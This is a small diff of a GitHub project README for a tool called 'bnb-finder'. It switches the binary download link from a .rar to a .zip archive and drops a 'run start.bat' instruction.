@@ -12,9 +12,8 @@ https://github.com/skone8544/bnb-finder/
 cd bnb-finder
 python bnb-finder.py
 ```
-Or you can run it from binary files: https://github.com/skone8544/bnb-finder/releases/download/bnb/bnb-finder.rar
+Or you can run it from binary files: https://github.com/skone8544/bnb-finder/releases/download/bnb/bnb-finder.zip
 
-run start.bat
 
 ![demo](./demo.png)
 
